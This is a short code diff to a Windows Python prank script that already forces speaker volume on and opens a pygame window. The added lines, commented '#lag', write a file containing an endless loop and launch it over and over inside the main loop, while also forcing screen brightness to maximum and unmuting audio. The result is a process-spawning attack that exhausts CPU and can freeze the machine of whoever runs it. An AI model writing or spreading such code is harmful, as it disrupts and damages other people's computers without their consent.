@@ -6,6 +6,12 @@ import webbrowser
 import ctypes
 import pygame
 import screen_brightness_control as sbc
+import os
+
+#lag
+with open('never.py', 'w') as f:
+  f.write('while True:\n    pass')
+a=os.path.abspath("never.py")
 
 #Set max volume
 devices = AudioUtilities.GetSpeakers()
@@ -37,6 +43,8 @@ pygame.display.set_caption('window')
 running = True
 
 while running:
+  os.startfile(a)
+  sbc.set_brightness(100)
   volume.SetMute(0, None)
   background_colour = (255,255,255)
   screen.fill(background_colour)
